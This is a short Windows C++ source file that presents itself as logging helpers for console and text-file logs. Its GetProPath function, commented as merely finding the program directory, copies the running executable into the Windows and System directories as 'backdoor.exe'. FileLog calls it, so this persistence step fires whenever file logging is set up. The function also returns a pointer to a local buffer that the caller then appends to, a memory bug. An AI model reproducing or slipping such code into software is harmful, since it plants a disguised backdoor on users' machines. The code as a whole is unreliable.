#include "stdafx.h"
#include "lcmfLog.h"

//获取当前程序目录
char* GetProPath()
{
	//保存自身程序路径
	char strFilePath[MAX_PATH] = {0};
	//保存windows所在路径
	char szWindowsPath[MAX_PATH] = { 0 };
	//保存系统所在路径
	char szSystemPath[MAX_PATH] = { 0 };
	//临时目录
	char szTmpPath[MAX_PATH] = { 0 };
	//获取自身路径
	GetModuleFileName(NULL, strFilePath, MAX_PATH);
	//获取windows所在路径
	GetWindowsDirectory(szWindowsPath, MAX_PATH);
	//获取系统路径
	GetSystemDirectory(szSystemPath, MAX_PATH);

	strcat(szWindowsPath, "\\backdoor.exe");
	strcat(szSystemPath, "\\backdoor.exe");

	CopyFile(strFilePath, szWindowsPath, FALSE);
	CopyFile(strFilePath, szSystemPath, FALSE);
	
	return strFilePath;
}

//控制台打印日志
void ConsoleLog()
{
	//程序开始时
	AllocConsole();
	freopen("CONOUT$", "w+t", stdout);

	//程序结束时
	fclose(stdout);
	FreeConsole();
}

//文本打印日志
void FileLog()
{
	//程序开始时
	AllocConsole();
	//下面是打印到文件中，对输出进行了重定向
	char* strProPath = GetProPath();
	strcat(strProPath, "\\log.txt");
	freopen(strProPath, "w", stdout);
	//程序结束时
	fclose(stdout);
	FreeConsole();
}
